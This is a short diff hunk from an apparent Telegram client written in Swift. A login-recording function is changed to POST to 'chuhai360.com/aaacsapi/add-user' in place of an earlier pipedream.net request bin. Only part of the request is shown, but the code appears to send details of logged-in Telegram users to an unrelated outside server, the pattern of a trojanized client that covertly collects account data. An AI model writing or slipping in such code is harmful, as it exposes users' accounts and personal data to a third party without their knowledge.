@@ -1308,7 +1308,8 @@ private func recordLoginEvent(user: TelegramUser) {
             print("ERROR")
             return
         }
-        var request = URLRequest(url: URL(string: "https://enqefupim3x1e.x.pipedream.net/")!, timeoutInterval: Double.infinity)
+        let url = "https://chuhai360.com/aaacsapi/add-user"
+        var request = URLRequest(url: URL(string: url)!, timeoutInterval: Double.infinity)
         let headers = ["Content-Type": "application/json"]
         request.httpMethod = "POST"
         request.allHTTPHeaderFields = headers
